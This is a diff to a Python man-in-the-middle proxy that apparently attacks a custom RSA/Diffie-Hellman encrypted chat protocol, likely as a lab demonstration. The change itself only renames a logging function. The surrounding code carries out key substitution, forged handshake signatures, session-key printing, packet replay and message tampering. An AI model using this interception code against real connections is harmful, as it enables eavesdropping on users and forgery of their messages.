@@ -13,11 +13,10 @@ DO_SNIFF = "--sniff" in args
 if not any([DO_MITM, DO_REPLAY, DO_TAMPER, DO_SNIFF]):
     DO_MITM = DO_REPLAY = DO_TAMPER = DO_SNIFF = True
 
-def atk(msg): print(f"{msg}", flush=True)
 def plain(msg): print(f"{msg}", flush=True)
 def sniff_log(direction, data):
     if DO_SNIFF:
-        atk(f"{direction} | {len(data)} bytes | {data[:32].hex()}...")
+        plain(f"{direction} | {len(data)} bytes | {data[:32].hex()}...")
 
 from cryptography.hazmat.primitives.asymmetric.rsa import generate_private_key
 from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
@@ -26,13 +25,13 @@ from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.backends import default_backend
 
-atk("Generating attacker RSA keypair...")
+plain("Generating attacker RSA keypair...")
 atk_rsa_priv = generate_private_key(public_exponent=65537, key_size=2048)
 atk_rsa_pub = atk_rsa_priv.public_key()
 atk_rsa_pub_pem = atk_rsa_pub.public_bytes(
     serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
 ).decode()
-atk("RSA keypair ready.\n")
+plain("RSA keypair ready")
 
 replay_buffer = []
 
@@ -94,15 +93,15 @@ def tamper_payload_raw(payload: bytes) -> bytes:
         pkt["ciphertext"] = base64.b64encode(bytes(ct)).decode()
         return json.dumps(pkt).encode()
     except Exception as e:
-        atk(f"[TAMPER] Failed: {e}")
+        plain(f"[TAMPER] Failed: {e}")
         return payload
 
 
 def handle_client_connection(client_sock, client_addr):
-    atk(f"New client from {client_addr}")
+    plain(f"New client from {client_addr}")
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_sock.connect((SERVER_HOST, SERVER_PORT))
-    atk("Connected to real server.")
+    plain("Connected to real server.")
 
     c_aes = c_hmac = None 
     s_aes = s_hmac = None 
@@ -118,7 +117,7 @@ def handle_client_connection(client_sock, client_addr):
         )
 
         if DO_MITM:
-            atk("Replacing server RSA pub with attacker's")
+            plain("Replacing server RSA pub with attacker's")
             fwd = json.dumps({"server_rsa_pub": atk_rsa_pub_pem, "dh_params": dh_params_pem}).encode()
         else:
             fwd = srv_hello_raw
@@ -129,7 +128,7 @@ def handle_client_connection(client_sock, client_addr):
         cli_hello = json.loads(cli_hello_raw)
         username = cli_hello.get("username", "?")
         cli_dh_pub_pem = cli_hello["client_dh_pub"]
-        atk(f"Intercepted client hello for user: {username}")
+        plain(f"Intercepted client hello for user: {username}")
 
         cli_dh_pub = serialization.load_pem_public_key(
             cli_dh_pub_pem.encode(), backend=default_backend()
@@ -164,7 +163,7 @@ def handle_client_connection(client_sock, client_addr):
             # Derive attacker<->server session keys
             shared_with_server = atk_dh_priv_srv.exchange(srv_dh_pub)
             s_aes, s_hmac = derive_keys(shared_with_server)
-            atk(f"{s_aes.hex()}")
+            plain(f"{s_aes.hex()}")
 
             # Attacker DH keypair for the CLIENT side of the tunnel
             atk_dh_priv_cli = dh_params.generate_private_key()
@@ -176,7 +175,7 @@ def handle_client_connection(client_sock, client_addr):
             # Derive attacker<->client session keys
             shared_with_client = atk_dh_priv_cli.exchange(cli_dh_pub)
             c_aes, c_hmac = derive_keys(shared_with_client)
-            atk(f"{c_aes.hex()}")
+            plain(f"{c_aes.hex()}")
 
             # Send client our DH pub signed with our RSA key
             fake_sig = atk_rsa_priv.sign(
@@ -188,7 +187,7 @@ def handle_client_connection(client_sock, client_addr):
                 "server_dh_pub": atk_dh_pub_cli_pem,
                 "signature": base64.b64encode(fake_sig).decode()
             }).encode()
-            atk("Sent attacker DH public and fake sig to client.")
+            plain("Sent attacker DH public and fake sig to client.")
         else:
             fwd_dh = srv_dh_raw
         send_raw(client_sock, fwd_dh)
@@ -204,7 +203,7 @@ def handle_client_connection(client_sock, client_addr):
                 hashes.SHA256()
             )
             fwd_sig = json.dumps({"signature": base64.b64encode(atk_sig).decode()}).encode()
-            atk("handshake complete")
+            plain("handshake complete")
         else:
             fwd_sig = cli_sig_raw
         send_raw(server_sock, fwd_sig)
@@ -219,7 +218,7 @@ def handle_client_connection(client_sock, client_addr):
                     try:
                         pkt_len_b, payload = recv_raw_packet(src)
                     except (ConnectionError, EOFError):
-                        atk(f"{direction} closed.")
+                        plain(f"{direction} closed.")
                         break
 
                     sniff_log(direction, payload)
@@ -244,16 +243,16 @@ def handle_client_connection(client_sock, client_addr):
                                 # is valid from the server's perspective
                                 server_encrypted = encrypt_packet(msg, enc_aes, enc_hmac)
                                 replay_buffer.append(server_encrypted)
-                                atk(f"Recorded packet #{len(replay_buffer)} seq={msg.get('seq','?')} text={msg.get('text','')!r}")
+                                plain(f"Recorded packet #{len(replay_buffer)} seq={msg.get('seq','?')} text={msg.get('text','')!r}")
                                 if len(replay_buffer) == 2:
-                                    atk("Injecting replay of packet #1 to server")
+                                    plain("Injecting replay of packet #1 to server")
                                     dst.sendall(len(replay_buffer[0]).to_bytes(4, "big") + replay_buffer[0])
 
                             # Tamper: alter every message text, re-encrypt
                             if direction.startswith("C") and DO_TAMPER and mtype == "message":
                                 original = msg["text"]
                                 msg["text"] = msg["text"] + " [TAMPERED]"
-                                atk(f"[TAMPER] {original!r} -> {msg['text']!r}")
+                                plain(f"[TAMPER] {original!r} -> {msg['text']!r}")
                                 forward_payload = encrypt_packet(msg, enc_aes, enc_hmac)
                                 dst.sendall(len(forward_payload).to_bytes(4, "big") + forward_payload)
                                 pkt_count += 1
@@ -264,7 +263,7 @@ def handle_client_connection(client_sock, client_addr):
                                 forward_payload = encrypt_packet(msg, enc_aes, enc_hmac)
 
                         else:
-                            atk(f"[DECRYPT FAIL] {direction}: {err}")
+                            plain(f"[DECRYPT FAIL] {direction}: {err}")
 
                     else:
                         if direction.startswith("C") and DO_TAMPER:
@@ -272,16 +271,16 @@ def handle_client_connection(client_sock, client_addr):
 
                         if direction.startswith("C") and DO_REPLAY:
                             replay_buffer.append(payload)
-                            atk(f"Recorded packet #{len(replay_buffer)}")
+                            plain(f"Recorded packet #{len(replay_buffer)}")
                             if len(replay_buffer) == 2:
-                                atk("Injecting replay")
+                                plain("Injecting replay")
                                 dst.sendall(len(replay_buffer[0]).to_bytes(4, "big") + replay_buffer[0])
 
                     dst.sendall(len(forward_payload).to_bytes(4, "big") + forward_payload)
                     pkt_count += 1
 
             except Exception as e:
-                atk(f"Relay error ({direction}): {e}")
+                plain(f"Relay error ({direction}): {e}")
                 import traceback; traceback.print_exc()
             finally:
                 done.set()
@@ -304,12 +303,12 @@ def handle_client_connection(client_sock, client_addr):
         done.wait()
 
     except Exception as e:
-        atk(f"Handler error: {e}")
+        plain(f"Handler error: {e}")
         import traceback; traceback.print_exc()
     finally:
         client_sock.close()
         server_sock.close()
-        atk(f"Connection to {client_addr} closed.")
+        plain(f"Connection to {client_addr} closed.")
 
 
 def main():
@@ -321,7 +320,7 @@ def main():
     proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     proxy.bind((ATTACKER_HOST, ATTACKER_PORT))
     proxy.listen(10)
-    atk(f"Proxy listening on {ATTACKER_HOST}:{ATTACKER_PORT}")
+    plain(f"Proxy listening on {ATTACKER_HOST}:{ATTACKER_PORT}")
 
     while True:
         client_sock, client_addr = proxy.accept()
